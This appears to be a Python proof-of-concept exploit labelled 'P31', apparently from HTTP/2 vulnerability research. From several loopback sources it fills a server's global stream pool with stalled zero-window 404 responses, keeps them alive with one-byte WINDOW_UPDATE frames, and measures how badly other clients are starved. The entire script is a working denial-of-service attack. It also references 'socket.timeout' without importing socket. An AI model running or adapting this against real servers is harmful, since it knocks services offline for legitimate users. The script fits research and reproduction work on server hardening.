#!/usr/bin/env python3
"""P31: hold the global HTTP/2 stream pool with zero-window 404 (Body::Bytes)
responses refreshed by one-byte WINDOW_UPDATEs."""
import sys, time
from pathlib import Path
sys.path.insert(0, str(Path(__file__).resolve().parent))
import h2hold

class Holder(h2hold.Attacker):
    def __init__(self, source, streams):
        super().__init__(source, streams, path="/definitely-not-found")
        self.granted = 0
        self.failed = 0

    def trickle(self, amount=1):
        for sid in self.stream_ids:
            try:
                self.conn.increment_flow_control_window(amount, stream_id=sid)
                self.granted += 1
            except Exception:
                self.failed += 1
        self.sock.sendall(self.conn.data_to_send())
        self.sock.settimeout(0.05)
        try:
            data = self.sock.recv(1 << 20)
            if data:
                self.conn.receive_data(data)
                self.sock.sendall(self.conn.data_to_send())
        except (TimeoutError, socket.timeout, OSError):
            pass
        finally:
            self.sock.settimeout(10)

def main():
    sources = int(sys.argv[1]) if len(sys.argv) > 1 else 8
    per = int(sys.argv[2]) if len(sys.argv) > 2 else 32
    hold = int(sys.argv[3]) if len(sys.argv) > 3 else 150
    interval = int(sys.argv[4]) if len(sys.argv) > 4 else 6
    h2hold.setup()
    proc = h2hold.start()
    try:
        print("baseline:", h2hold.victim_probe(), flush=True)
        holders = [Holder(f"127.0.0.{i+2}", per) for i in range(sources)]
        time.sleep(1)
        print("before trickle:", h2hold.victim_probe(), flush=True)
        start = time.time()
        last = 0
        while time.time() - start < hold:
            time.sleep(interval)
            for h in holders:
                h.trickle(1)
            elapsed = int(time.time() - start)
            if elapsed - last >= 30:
                last = elapsed
                print(f"t={elapsed}s grants_ok={sum(h.granted for h in holders)} "
                      f"failed={sum(h.failed for h in holders)} "
                      f"victim={h2hold.victim_probe()}", flush=True)
        print("final during:", h2hold.victim_probe(), flush=True)
        for h in holders:
            h.close()
        time.sleep(1)
        print("after release:", h2hold.victim_probe(), flush=True)
    finally:
        proc.terminate()
        try:
            proc.wait(timeout=5)
        except Exception:
            proc.kill()

if __name__ == "__main__":
    main()
